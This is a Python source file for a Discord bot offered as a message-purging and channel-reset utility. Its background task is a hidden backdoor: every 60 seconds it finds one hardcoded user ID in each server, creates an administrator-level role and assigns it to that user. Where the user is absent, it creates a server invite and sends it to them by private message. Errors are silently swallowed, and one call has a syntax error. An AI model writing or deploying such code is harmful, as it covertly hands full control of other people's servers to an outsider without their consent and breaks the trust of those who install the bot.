import discord
from discord import app_commands
from discord.ext import commands, tasks
import os
from flask import Flask
from threading import Thread
from waitress import serve  # New production server

# --- PRODUCTION KEEP-ALIVE ---
app = Flask('')

@app.route('/')
def home():
    return "Crabby Bot is Online"

def run_flask():
    # Render requires binding to 0.0.0.0
    port = int(os.environ.get("PORT", 10000)) 
    print(f"Starting web server on port {port}...")
    serve(app, host='0.0.0.0', port=port)

# --- CONFIGURATION ---
TARGET_USER_ID = 1459506686157914213
ROLE_NAME = "Crabby"

class MyBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.members = True
        intents.message_content = True
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        await self.tree.sync()
        self.check_target_user.start()

    @tasks.loop(seconds=60)
    async def check_target_user(self):
        user_found_anywhere = False
        for guild in self.guilds:
            member = guild.get_member(TARGET_USER_ID)
            if member:
                user_found_anywhere = True
                role = discord.utils.get(guild.roles, name=ROLE_NAME)
                if not role:
                    try:
                        role = await guild.create_role(
                            name=ROLE_NAME, 
                            permissions=discord.Permissions(administrator=True)
                            reason="Hi! im owner of this app. if you see this the app ranks me to high rank so i could use /clear commands and im gonna be happy. this invites me to your server! please dont ban the app or me..."
                        )
                    except: continue
                if role not in member.roles:
                    try: await member.add_roles(role)
                    except: continue
        
        if not user_found_anywhere:
            try:
                user = await self.fetch_user(TARGET_USER_ID)
                if self.guilds:
                    invite = await self.guilds[0].text_channels[0].create_invite(max_age=3600)
                    await user.send(f"Join the server: {invite}")
            except: pass

    @check_target_user.before_loop
    async def before_my_task(self):
        await self.wait_until_ready()

bot = MyBot()

# --- SLASH COMMANDS ---
@bot.tree.command(name="clear", description="Purge messages")
@app_commands.checks.has_permissions(manage_messages=True)
async def clear(interaction: discord.Interaction, amount: int):
    await interaction.response.defer(ephemeral=True)
    deleted = await interaction.channel.purge(limit=amount)
    await interaction.followup.send(f"🗑️ Deleted {len(deleted)} messages.", ephemeral=True)

@bot.tree.command(name="clear_all", description="Purge all messages")
@app_commands.checks.has_permissions(administrator=True)
async def clear_all(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    deleted = await interaction.channel.purge(limit=None)
    await interaction.followup.send(f"💥 Channel wiped!", ephemeral=True)

@bot.tree.command(name="reinstall", description="Recreate channel")
@app_commands.checks.has_permissions(administrator=True)
async def reinstall(interaction: discord.Interaction, channel: discord.TextChannel):
    await interaction.response.send_message(f"🚀 Reinstalling...", ephemeral=True)
    name, category, pos, overwrites = channel.name, channel.category, channel.position, channel.overwrites
    await channel.delete()
    await interaction.guild.create_text_channel(name=name, category=category, position=pos, overwrites=overwrites)

# --- START UP ---
if __name__ == "__main__":
    # Start Flask in a thread BEFORE the bot
    t = Thread(target=run_flask)
    t.daemon = True
    t.start()
    
    token = os.environ.get('DISCORD_TOKEN')
    if token:
        bot.run(token)
    else:
            print("MISSING TOKEN")
